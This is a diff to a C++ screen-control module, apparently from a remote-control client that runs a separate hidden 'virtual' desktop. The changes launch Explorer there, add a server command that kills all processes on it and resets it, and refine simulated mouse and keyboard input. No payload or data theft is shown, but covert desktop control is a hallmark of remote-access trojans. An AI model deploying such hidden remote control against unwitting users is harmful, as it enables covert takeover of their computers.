@@ -23,6 +23,8 @@
 #include <common/iniFile.h>
 #include "KernelManager.h"
 #include <wtsapi32.h>
+#include <vector>
+#include <algorithm>
 
 #pragma comment(lib, "Shlwapi.lib")
 #pragma comment(lib, "wtsapi32.lib")
@@ -153,7 +155,7 @@ std::wstring ConvertToWString(const std::string& multiByteStr)
     return wideStr;
 }
 
-bool LaunchApplication(TCHAR* pszApplicationFilePath, TCHAR* pszDesktopName)
+bool LaunchApplication(TCHAR* pszApplicationFilePath, TCHAR* pszDesktopName, TCHAR* pszCommandLine = NULL)
 {
     bool bReturn = false;
 
@@ -162,7 +164,7 @@ bool LaunchApplication(TCHAR* pszApplicationFilePath, TCHAR* pszDesktopName)
             return false;
 
         TCHAR szDirectoryName[MAX_PATH * 2] = { 0 };
-        TCHAR szExplorerFile[MAX_PATH * 2] = { 0 };
+        TCHAR szCommandLine[MAX_PATH * 4] = { 0 };
 
         strcpy_s(szDirectoryName, sizeof(szDirectoryName), pszApplicationFilePath);
 
@@ -170,6 +172,14 @@ bool LaunchApplication(TCHAR* pszApplicationFilePath, TCHAR* pszDesktopName)
         if (!PathIsExe(path.c_str()))
             return false;
         PathRemoveFileSpec(szDirectoryName);
+
+        // 构建命令行：程序路径 + 参数
+        if (pszCommandLine && strlen(pszCommandLine) > 0) {
+            sprintf_s(szCommandLine, sizeof(szCommandLine), "\"%s\" %s", pszApplicationFilePath, pszCommandLine);
+        } else {
+            sprintf_s(szCommandLine, sizeof(szCommandLine), "\"%s\"", pszApplicationFilePath);
+        }
+
         STARTUPINFO sInfo = { 0 };
         PROCESS_INFORMATION pInfo = { 0 };
 
@@ -178,8 +188,8 @@ bool LaunchApplication(TCHAR* pszApplicationFilePath, TCHAR* pszDesktopName)
 
         //Launching a application into desktop
         SetLastError(0);
-        BOOL bCreateProcessReturn = CreateProcess(pszApplicationFilePath,
-                                    NULL,
+        BOOL bCreateProcessReturn = CreateProcess(NULL,  // lpApplicationName = NULL
+                                    szCommandLine,       // lpCommandLine 包含完整命令
                                     NULL,
                                     NULL,
                                     TRUE,
@@ -245,6 +255,49 @@ BOOL IsProcessRunningInDesktop(HDESK hDesk, const char* targetExeName)
     }, reinterpret_cast<LPARAM>(&data));
 
     return bFound;
+}
+
+// 关闭指定桌面上的所有窗口和进程（用于重置虚拟桌面）
+void CloseAllWindowsInDesktop(HDESK hDesk)
+{
+    // 收集所有需要终止的进程ID（EnumDesktopWindows 不需要切换线程桌面）
+    std::vector<DWORD> processIds;
+    BOOL enumResult = EnumDesktopWindows(hDesk, [](HWND hWnd, LPARAM lParam) -> BOOL {
+        auto* pIds = (std::vector<DWORD>*)lParam;
+        DWORD pid = 0;
+        GetWindowThreadProcessId(hWnd, &pid);
+        if (pid != 0 && pid != GetCurrentProcessId()) {
+            // 避免重复
+            if (std::find(pIds->begin(), pIds->end(), pid) == pIds->end()) {
+                pIds->push_back(pid);
+            }
+        }
+        char title[256] = {};
+        GetWindowTextA(hWnd, title, sizeof(title));
+        Mprintf("枚举窗口: %s [%p] pid=%d\n", title, hWnd, pid);
+        // 先尝试正常关闭
+        PostMessageA(hWnd, WM_CLOSE, 0, 0);
+        return TRUE;
+    }, (LPARAM)&processIds);
+
+    if (!enumResult) {
+        Mprintf("EnumDesktopWindows failed: %d\n", GetLastError());
+    }
+
+    // 等待窗口关闭
+    Sleep(300);
+
+    // 强制终止所有相关进程
+    for (DWORD pid : processIds) {
+        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
+        if (hProcess) {
+            TerminateProcess(hProcess, 0);
+            CloseHandle(hProcess);
+            Mprintf("终止进程: %d\n", pid);
+        }
+    }
+
+    Mprintf("CloseAllWindowsInDesktop: 已处理 %d 个进程\n", (int)processIds.size());
 }
 
 // 检查当前进程是否以管理员身份运行
@@ -371,6 +424,8 @@ void CScreenManager::InitScreenSpy()
     if (level >= 0 && level < QUALITY_COUNT) {
         algo = m_QualityProfiles[level].algorithm;
     }
+    // 保存屏幕类型，服务端用于判断是否显示虚拟桌面相关菜单
+    m_ScreenSettings.ScreenType = DXGI;
     Mprintf("CScreenManager: Type %d Algorithm: %d (QualityLevel=%d)\n", DXGI, int(algo), level);
     if (DXGI == USING_VIRTUAL) {
         m_virtual = TRUE;
@@ -386,7 +441,17 @@ void CScreenManager::InitScreenSpy()
             GetWindowsDirectory(szExplorerFile, MAX_PATH * 2 - 1);
             strcat_s(szExplorerFile, MAX_PATH * 2 - 1, "\\Explorer.Exe");
             if (!IsProcessRunningInDesktop(hDesk, szExplorerFile)) {
-                if (!LaunchApplication(szExplorerFile, (char*)m_DesktopID.c_str())) {
+                // 使用 /separate 强制创建独立进程，否则 Explorer 会连接到已有的 Shell
+                if (LaunchApplication(szExplorerFile, (char*)m_DesktopID.c_str(), (TCHAR*)"/separate,C:\\")) {
+                    // 等待 Explorer 初始化完成（最多等待 3 秒）
+                    for (int i = 0; i < 30; i++) {
+                        Sleep(100);
+                        if (IsProcessRunningInDesktop(hDesk, szExplorerFile)) {
+                            Mprintf("Explorer 已启动，等待了 %d ms\n", (i + 1) * 100);
+                            break;
+                        }
+                    }
+                } else {
                     Mprintf("启动资源管理器失败[%s]!!!\n", m_DesktopID.c_str());
                 }
             } else {
@@ -836,6 +901,22 @@ VOID CScreenManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
         }
         break;
     }
+    case CMD_RESET_VIRTUAL_DESKTOP: {
+        // 重置虚拟桌面：关闭所有窗口，然后重启截屏
+        if (m_virtual && g_hDesk) {
+            Mprintf("重置虚拟桌面...\n");
+            CloseAllWindowsInDesktop(g_hDesk);
+            // 等待窗口关闭
+            Sleep(500);
+            // 关闭桌面句柄使其被销毁
+            CloseDesktop(g_hDesk);
+            g_hDesk = nullptr;
+            // 重启截屏线程（会创建新的桌面）
+            RestartScreen();
+            Mprintf("虚拟桌面已重置\n");
+        }
+        break;
+    }
     case COMMAND_NEXT: {
         m_DlgID = ulLength >= 9 ? *((uint64_t*)(szBuffer + 1)) : 0;
         // 解析服务端能力标志（如果有）
@@ -1134,6 +1215,12 @@ VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
                 mouseMsg = TRUE;
                 m_point = msg->pt;
                 hWnd = WindowFromPoint(m_point);
+                if (msg->message == WM_LBUTTONDOWN) {
+                    char szClass[64] = {};
+                    if (hWnd) GetClassNameA(hWnd, szClass, sizeof(szClass));
+                    Mprintf("虚拟桌面点击: (%d,%d) hWnd=%p class=%s\n",
+                            m_point.x, m_point.y, hWnd, szClass);
+                }
                 lastPointCopy = m_lastPoint;
                 m_lastPoint = m_point;
                 if (msg->message == WM_RBUTTONDOWN) {
@@ -1143,12 +1230,34 @@ VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
                 } else if (msg->message == WM_RBUTTONUP) {
                     m_rmouseDown = FALSE;
                     m_rclickWnd = WindowFromPoint(m_rclickPoint);
-                    // 检查是否为系统菜单（如任务栏）
+                    // 检查是否为任务栏相关窗口
                     char szClass[256] = {};
                     GetClassNameA(m_rclickWnd, szClass, sizeof(szClass));
                     Mprintf("Right click on '%s' %s[%p]\n", szClass, GetTitle(hWnd).c_str(), hWnd);
-                    if (strcmp(szClass, "Shell_TrayWnd") == 0) {
-                        // 触发系统级右键菜单（任务栏）
+
+                    // 检查是否为任务栏或其子窗口
+                    BOOL isTaskbar = (strcmp(szClass, "Shell_TrayWnd") == 0 ||
+                                      strcmp(szClass, "MSTaskListWClass") == 0 ||
+                                      strcmp(szClass, "MSTaskSwWClass") == 0 ||
+                                      strcmp(szClass, "TrayNotifyWnd") == 0 ||
+                                      strcmp(szClass, "Start") == 0 ||
+                                      strcmp(szClass, "ReBarWindow32") == 0);
+                    // 如果不是已知的任务栏类，检查父窗口链
+                    if (!isTaskbar) {
+                        HWND hParent = GetParent(m_rclickWnd);
+                        while (hParent) {
+                            GetClassNameA(hParent, szClass, sizeof(szClass));
+                            if (strcmp(szClass, "Shell_TrayWnd") == 0) {
+                                isTaskbar = TRUE;
+                                break;
+                            }
+                            hParent = GetParent(hParent);
+                        }
+                    }
+
+                    if (isTaskbar) {
+                        // 任务栏右键菜单：使用屏幕坐标发送 WM_CONTEXTMENU
+                        Mprintf("Taskbar right click at: %d, %d\n", m_rclickPoint.x, m_rclickPoint.y);
                         PostMessage(m_rclickWnd, WM_CONTEXTMENU, (WPARAM)m_rclickWnd,
                                     MAKELPARAM(m_rclickPoint.x, m_rclickPoint.y));
                     } else {
@@ -1169,6 +1278,54 @@ VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
                         m_rclickWnd = nullptr;
                     }
                     m_lmouseDown = FALSE;
+
+                    // 检查是否为任务栏相关窗口
+                    char szClass[256] = {};
+                    GetClassNameA(hWnd, szClass, sizeof(szClass));
+                    BOOL isTaskbar = (strcmp(szClass, "Shell_TrayWnd") == 0 ||
+                                      strcmp(szClass, "MSTaskListWClass") == 0 ||
+                                      strcmp(szClass, "MSTaskSwWClass") == 0 ||
+                                      strcmp(szClass, "TrayNotifyWnd") == 0 ||
+                                      strcmp(szClass, "ReBarWindow32") == 0);
+                    if (!isTaskbar) {
+                        HWND hParent = GetParent(hWnd);
+                        while (hParent) {
+                            GetClassNameA(hParent, szClass, sizeof(szClass));
+                            if (strcmp(szClass, "Shell_TrayWnd") == 0) {
+                                isTaskbar = TRUE;
+                                break;
+                            }
+                            hParent = GetParent(hParent);
+                        }
+                    }
+                    if (isTaskbar) {
+                        // 任务栏左键点击：需要获取输入权限才能正确模拟点击
+                        Mprintf("Taskbar left click at: %d, %d on %s\n", m_point.x, m_point.y, szClass);
+
+                        // 获取任务栏线程并附加输入
+                        HWND hTaskbar = FindWindowA("Shell_TrayWnd", NULL);
+                        if (hTaskbar) {
+                            DWORD taskbarThreadId = GetWindowThreadProcessId(hTaskbar, NULL);
+                            DWORD currentThreadId = GetCurrentThreadId();
+
+                            // 允许设置前台窗口
+                            AllowSetForegroundWindow(ASFW_ANY);
+
+                            // 附加到任务栏线程的输入队列
+                            AttachThreadInput(currentThreadId, taskbarThreadId, TRUE);
+
+                            // 模拟鼠标点击
+                            SetCursorPos(m_point.x, m_point.y);
+                            mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
+                            Sleep(80);
+                            mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
+
+                            // 分离输入队列
+                            AttachThreadInput(currentThreadId, taskbarThreadId, FALSE);
+                        }
+                        continue;
+                    }
+
                     LRESULT lResult = SendMessageA(hWnd, WM_NCHITTEST, NULL, msg->lParam);
                     switch (lResult) {
                     case HTTRANSPARENT: {
@@ -1201,6 +1358,84 @@ VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
                 } else if (msg->message == WM_LBUTTONDOWN) {
                     m_lmouseDown = TRUE;
                     m_hResMoveWindow = NULL;
+                    // 获取顶层窗口来判断点击位置
+                    HWND hTopWnd = GetAncestor(hWnd, GA_ROOT);
+                    if (!hTopWnd) hTopWnd = hWnd;
+                    // 在按下时就记录操作类型，避免移动后误判为边框调整
+                    m_resMoveType = SendMessageA(hTopWnd, WM_NCHITTEST, NULL, msg->lParam);
+
+                    // 修正现代 UI (WinUI 3) 标题栏检测和 DWM 阴影误判
+                    RECT frameRect;
+                    if (SUCCEEDED(DwmGetWindowAttribute(hTopWnd, DWMWA_EXTENDED_FRAME_BOUNDS,
+                            &frameRect, sizeof(frameRect)))) {
+                        int captionHeight = GetSystemMetrics(SM_CYCAPTION) + GetSystemMetrics(SM_CYFRAME) + 8;
+                        int relX = m_point.x - frameRect.left;  // 相对于窗口左边的 X 坐标
+                        int relY = m_point.y - frameRect.top;   // 相对于窗口顶部的 Y 坐标
+                        Mprintf("点击位置: relX=%d, relY=%d, captionHeight=%d\n", relX, relY, captionHeight);
+
+                        // Windows 11 文件管理器工具栏按钮检测（在标题栏下方的工具栏区域）
+                        // 工具栏 Y 范围：captionHeight 到 captionHeight+50 (大约 35-85)
+                        if (relY >= captionHeight && relY < captionHeight + 50 && relX >= 0 && relX < 160) {
+                            // 工具栏按钮区域（返回、前进、向上）
+                            BYTE vkKey = 0;
+                            const char* btnName = NULL;
+                            if (relX < 50) {
+                                vkKey = VK_LEFT;  // 返回：Alt + Left
+                                btnName = "返回";
+                            } else if (relX < 100) {
+                                vkKey = VK_RIGHT; // 前进：Alt + Right
+                                btnName = "前进";
+                            } else if (relX < 160) {
+                                vkKey = VK_UP;    // 向上：Alt + Up
+                                btnName = "向上";
+                            }
+                            if (vkKey) {
+                                Mprintf("工具栏按钮点击: %s (relX=%d, relY=%d)\n", btnName, relX, relY);
+
+                                // 方法1: 尝试 WM_APPCOMMAND (浏览器导航命令)
+                                #define APPCOMMAND_BROWSER_BACKWARD 1
+                                #define APPCOMMAND_BROWSER_FORWARD  2
+                                #define FAPPCOMMAND_KEY 0x8000
+
+                                if (vkKey == VK_LEFT) {
+                                    // 返回
+                                    LPARAM cmd = MAKELPARAM(0, APPCOMMAND_BROWSER_BACKWARD | FAPPCOMMAND_KEY);
+                                    SendMessage(hTopWnd, WM_APPCOMMAND, (WPARAM)hTopWnd, cmd);
+                                } else if (vkKey == VK_RIGHT) {
+                                    // 前进
+                                    LPARAM cmd = MAKELPARAM(0, APPCOMMAND_BROWSER_FORWARD | FAPPCOMMAND_KEY);
+                                    SendMessage(hTopWnd, WM_APPCOMMAND, (WPARAM)hTopWnd, cmd);
+                                } else if (vkKey == VK_UP) {
+                                    // 向上 - 没有 APPCOMMAND，尝试多种方法
+                                    SetForegroundWindow(hTopWnd);
+
+                                    // 方法1: 发送到点击的子窗口
+                                    PostMessage(hWnd, WM_SYSKEYDOWN, VK_UP, (1 << 29) | (MapVirtualKey(VK_UP, 0) << 16) | 1);
+                                    PostMessage(hWnd, WM_SYSKEYUP, VK_UP, (1 << 29) | (MapVirtualKey(VK_UP, 0) << 16) | (3 << 30) | 1);
+
+                                    // 方法2: 也发送到顶层窗口
+                                    PostMessage(hTopWnd, WM_SYSKEYDOWN, VK_UP, (1 << 29) | (MapVirtualKey(VK_UP, 0) << 16) | 1);
+                                    PostMessage(hTopWnd, WM_SYSKEYUP, VK_UP, (1 << 29) | (MapVirtualKey(VK_UP, 0) << 16) | (3 << 30) | 1);
+                                }
+                                continue;
+                            }
+                        }
+
+                        // 检查是否在标题栏拖动区域
+                        BOOL inCaptionArea = (relY >= 0 && relY < captionHeight &&
+                                              relX >= 140 && m_point.x < frameRect.right - 150);
+                        if (inCaptionArea) {
+                            // WinUI 3 自定义标题栏返回 HTCLIENT，强制改为 HTCAPTION
+                            if (m_resMoveType == HTCLIENT) {
+                                m_resMoveType = HTCAPTION;
+                                Mprintf("强制设置为 HTCAPTION (WinUI 3 自定义标题栏)\n");
+                            }
+                            // DWM 阴影导致的边框误判，也改为 HTCAPTION
+                            else if (m_resMoveType == HTTOP || m_resMoveType == HTTOPLEFT || m_resMoveType == HTTOPRIGHT) {
+                                m_resMoveType = HTCAPTION;
+                            }
+                        }
+                    }
                     RECT startButtonRect;
                     HWND hStartButton = FindWindowA((PCHAR)"Button", NULL);
                     GetWindowRect(hStartButton, &startButtonRect);
@@ -1219,13 +1454,16 @@ VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
                             continue;
                         }
                     }
+                    // 记录按下时的窗口，用于后续移动/调整（使用顶层窗口）
+                    m_hResMoveWindow = hTopWnd;
+                    Mprintf("记录拖动窗口: hWnd=%p, hTopWnd=%p, m_resMoveType=%d (HTCAPTION=%d)\n",
+                            hWnd, hTopWnd, m_resMoveType, HTCAPTION);
                 } else if (msg->message == WM_MOUSEMOVE) {
-                    if (!m_lmouseDown)
+                    if (!m_lmouseDown || !m_hResMoveWindow) {
+                        // Mprintf("跳过移动: lmouseDown=%d, hResMoveWindow=%p\n", m_lmouseDown, m_hResMoveWindow);
                         continue;
-                    if (!m_hResMoveWindow)
-                        m_resMoveType = SendMessageA(hWnd, WM_NCHITTEST, NULL, msg->lParam);
-                    else
-                        hWnd = m_hResMoveWindow;
+                    }
+                    hWnd = m_hResMoveWindow;
                     int moveX = lastPointCopy.x - m_point.x;
                     int moveY = lastPointCopy.y - m_point.y;
 
@@ -1235,6 +1473,7 @@ VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
                     int y = rect.top;
                     int width = rect.right - rect.left;
                     int height = rect.bottom - rect.top;
+                    BOOL needResize = FALSE;
                     switch (m_resMoveType) {
                     case HTCAPTION: {
                         x -= moveX;
@@ -1244,19 +1483,23 @@ VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
                     case HTTOP: {
                         y -= moveY;
                         height += moveY;
+                        needResize = TRUE;
                         break;
                     }
                     case HTBOTTOM: {
                         height -= moveY;
+                        needResize = TRUE;
                         break;
                     }
                     case HTLEFT: {
                         x -= moveX;
                         width += moveX;
+                        needResize = TRUE;
                         break;
                     }
                     case HTRIGHT: {
                         width -= moveX;
+                        needResize = TRUE;
                         break;
                     }
                     case HTTOPLEFT: {
@@ -1264,30 +1507,35 @@ VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
                         height += moveY;
                         x -= moveX;
                         width += moveX;
+                        needResize = TRUE;
                         break;
                     }
                     case HTTOPRIGHT: {
                         y -= moveY;
                         height += moveY;
                         width -= moveX;
+                        needResize = TRUE;
                         break;
                     }
                     case HTBOTTOMLEFT: {
                         height -= moveY;
                         x -= moveX;
                         width += moveX;
+                        needResize = TRUE;
                         break;
                     }
                     case HTBOTTOMRIGHT: {
                         height -= moveY;
                         width -= moveX;
+                        needResize = TRUE;
                         break;
                     }
                     default:
                         continue;
                     }
-                    MoveWindow(hWnd, x, y, width, height, FALSE);
-                    m_hResMoveWindow = hWnd;
+                    // 使用 SetWindowPos 代替 MoveWindow，支持异步重绘
+                    SetWindowPos(hWnd, NULL, x, y, width, height,
+                        SWP_NOZORDER | SWP_NOACTIVATE | (needResize ? 0 : SWP_NOSIZE));
                     continue;
                 }
                 break;
@@ -1302,7 +1550,14 @@ VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
             }
             if (mouseMsg)
                 msg->lParam = MAKELPARAM(m_point.x, m_point.y);
-            PostMessage(hWnd, msg->message, (WPARAM)msg->wParam, msg->lParam);
+            // 双击需要完整消息序列：LBUTTONDOWN -> LBUTTONDBLCLK -> LBUTTONUP
+            if (msg->message == WM_LBUTTONDBLCLK) {
+                PostMessage(hWnd, WM_LBUTTONDOWN, MK_LBUTTON, msg->lParam);
+                PostMessage(hWnd, WM_LBUTTONDBLCLK, MK_LBUTTON, msg->lParam);
+                PostMessage(hWnd, WM_LBUTTONUP, 0, msg->lParam);
+            } else {
+                PostMessage(hWnd, msg->message, (WPARAM)msg->wParam, msg->lParam);
+            }
         }
         return;
     }
